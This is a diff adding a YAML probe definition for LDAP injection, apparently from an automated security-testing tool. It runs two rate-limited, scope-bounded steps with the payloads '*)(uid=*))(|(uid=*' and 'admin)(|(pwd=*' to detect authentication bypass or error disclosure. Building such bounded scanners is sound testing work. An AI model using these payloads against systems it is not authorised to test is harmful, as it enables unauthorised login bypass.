@@ -1,0 +1,37 @@
+id: ldap_injection
+attack_class: ldap_injection
+preconditions:
+  methods: ["POST", "GET"]
+  auth_required: true
+steps:
+  - id: uid_bypass_probe
+    action: send_ldap_injection_probe
+    identity_selector: attacker
+    probe_template:
+      mode: bounded_probe
+      template: ldap_string_parameter
+      variables:
+        payload: "*)(uid=*))(|(uid=*"
+    expected_signal: auth bypass or LDAP error disclosure
+    validator: ldap_injection_validator
+    max_attempts: 1
+  - id: password_bypass_probe
+    action: send_ldap_injection_probe
+    identity_selector: attacker
+    probe_template:
+      mode: bounded_probe
+      template: ldap_string_parameter
+      variables:
+        payload: "admin)(|(pwd=*"
+    expected_signal: auth bypass or LDAP error disclosure
+    validator: ldap_injection_validator
+    max_attempts: 1
+validators:
+  ldap_injection_validator:
+    signal: auth_bypass_or_error_disclosure
+safety_budget:
+  max_requests: 3
+  max_attempts_per_step: 1
+  rate_limit_rps: 0.5
+  scope: current_endpoint
+  proof_gate: default
